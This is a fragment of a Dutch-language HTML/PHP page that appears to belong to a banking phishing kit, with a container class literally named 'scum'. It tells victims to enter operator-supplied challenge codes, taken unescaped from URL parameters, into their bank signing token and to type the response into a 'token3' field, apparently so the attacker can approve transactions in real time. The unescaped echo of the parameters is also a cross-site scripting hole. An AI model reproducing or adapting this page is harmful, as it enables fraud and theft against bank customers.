                    ...
                    <div class="scum_container">
                        <div class="scum" id="token3-view">
                                ...
                                <div class="step d-flex justify-content-between">
                                    ...
                                    <p class="step-p ng-binding">
                                       Ga de uitdaging van uw bevestiging in: <span class="num1"><?php echo $_GET['code']; ?></span> en druk op "OK"
                                    </p>
                                    <span class="pluss">+</span>
                                    <div>
                                        <img class="img1" src="./css/256pxok.png">
                                ...
                                <div class="step d-flex justify-content-between">
                                    ...
                                    <p class="step-p ng-binding">
                                       Ga de uitdaging van uw bevestiging in: <span class="num2"><?php echo $_GET['code2']; ?></span> en druk op "Ondertekenen"
                                    </p>
                                    <span class="pluss">+</span>
                                    <div>
                                        <img class="img1" src="./css/sign-1.png">
                                ...
                                <div class="form-group">
                                    ...
                                    <input type="text" name="token3" id="code" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-ng-model="data.code" required="">
